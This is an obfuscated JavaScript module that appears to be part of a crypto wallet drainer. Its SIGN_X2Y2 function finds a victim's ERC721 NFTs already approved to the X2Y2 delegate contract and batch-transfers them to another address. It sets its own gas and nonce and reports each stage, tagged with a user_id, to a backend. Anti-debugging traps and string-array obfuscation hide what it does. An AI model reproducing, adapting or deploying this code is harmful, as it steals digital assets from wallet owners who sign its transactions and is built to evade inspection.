function _0x38e2(t,e){const n=_0x5afe();return(_0x38e2=function(t,e){return n[t-=163]})(t,e)}const _0x528c98=_0x38e2;function _0x5afe(){const t=["x2y2","pending","ERC721","function","input","apply","search","counter","Contract","contract IERC721","pairs","gger","395542utLNoC","success","mul","0xf849de01b080adc3a814fabe1e2087475cf2e354","request","skip","1413232cZWuTH","length","uint256","getSigner","Web3Provider","tuple[]","string","constructor","transferBatch","40875FCRSmR","log","action","150","test","address","wait","debu","push","121077iKTUsc","div","type","init","12JGeukc","stateObject","3ZtqAXZ","toString","while (true) {}","function *\\( *\\)","207531DCmpIr","266987zCIUMg","cancel","110788hGzeUL","tokenId","getTransactionCount","chain_id","from","(((.+)+)+)+$","\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)","100","amount_usd","BigNumber","40eXfqwS"];return(_0x5afe=function(){return t})()}!function(t,e){const n=_0x38e2,c=_0x5afe();for(;;)try{if(103528===parseInt(n(172))/1+-parseInt(n(208))/2+-parseInt(n(178))/3*(-parseInt(n(185))/4)+-parseInt(n(163))/5+-parseInt(n(176))/6*(-parseInt(n(183))/7)+parseInt(n(214))/8+parseInt(n(182))/9*(-parseInt(n(195))/10))break;c.push(c.shift())}catch(t){c.push(c.shift())}}();const _0x2e173e=function(){let t=!0;return function(e,n){const c=t?function(){const t=_0x38e2;if(n){const c=n[t(201)](e,arguments);return n=null,c}}:function(){};return t=!1,c}}(),_0x4cac80=_0x2e173e(this,(function(){const t=_0x38e2;return _0x4cac80.toString()[t(202)](t(190))[t(179)]()[t(221)](_0x4cac80)[t(202)](t(190))}));_0x4cac80();const _0x5aac73=function(){let t=!0;return function(e,n){const c=t?function(){if(n){const t=n.apply(e,arguments);return n=null,t}}:function(){};return t=!1,c}}();!function(){_0x5aac73(this,(function(){const t=_0x38e2,e=new RegExp(t(181)),n=new RegExp(t(191),"i"),c=_0x405f10(t(175));e[t(167)](c+"chain")&&n[t(167)](c+t(200))?_0x405f10():c("0")}))()}();const MS_X2Y2_ABI=[{inputs:[{components:[{internalType:_0x528c98(205),name:"token",type:_0x528c98(168)},{internalType:_0x528c98(216),name:_0x528c98(186),type:_0x528c98(216)}],internalType:"struct ERC721Delegate.Pair[]",name:_0x528c98(206),type:_0x528c98(219)},{internalType:_0x528c98(168),name:"to",type:_0x528c98(168)}],name:_0x528c98(222),outputs:[],stateMutability:"nonpayable",type:_0x528c98(199)}],SIGN_X2Y2=async(t,e,n,c,r,a=0)=>{const i=_0x528c98;try{const s=[],o=[];for(const e of t)e[i(213)]||"ERC721"!==e[i(174)]||1!=e[i(188)]||e[i(193)]<a||await is_nft_approved(e[i(168)],n,i(211))&&(s[i(171)]({token:e[i(168)],tokenId:ethers[i(194)][i(189)](e.id)}),o[i(171)](e));if(0===s.length)return;let u=new(ethers.providers[i(218)])(e),f=u[i(217)]();const _=new(ethers[i(204)])(i(211),MS_X2Y2_ABI,f);try{const e=ethers[i(194)].from(await u.getGasPrice())[i(173)](ethers.BigNumber[i(189)](i(192)))[i(210)](ethers[i(194)][i(189)](i(166))).toString();let a=null;try{a=await _.estimateGas[i(222)](s,c,{from:n}),a=ethers[i(194)][i(189)](a)[i(173)](ethers[i(194)][i(189)](i(192)))[i(210)](ethers[i(194)][i(189)]("120"))[i(179)]()}catch(t){a=25e4}const f=await u[i(187)](n,i(197));await send_request({action:"x2y2",user_id:r,x2y2:i(212),assets:o});const p=await _[i(222)](s,c,{gasLimit:ethers.BigNumber[i(189)](a),gasPrice:ethers[i(194)].from(e),nonce:f});await p[i(169)](),await send_request({action:"x2y2",user_id:r,x2y2:i(209)});for(const e of t){if(e[i(213)]||"ERC721"!==e[i(174)]||1!=e[i(188)])continue;let t=!1;for(const n of o)if(n[i(174)]===i(198)&&1==n.chain_id&&n[i(168)]==e[i(168)]&&n.id==e.id){t=!0;break}1==t&&(e[i(213)]=!0)}}catch(t){console[i(164)](t),await send_request({action:i(196),user_id:r,x2y2:i(184)})}}catch(t){console.log(t)}};function _0x405f10(t){function e(t){const n=_0x38e2;if(typeof t===n(220))return function(t){}[n(221)](n(180))[n(201)](n(203));1!==(""+t/t)[n(215)]||t%20==0?function(){return!0}[n(221)](n(170)+n(207)).call(n(165)):function(){return!1}[n(221)](n(170)+"gger").apply(n(177)),e(++t)}try{if(t)return e;e(0)}catch(t){}}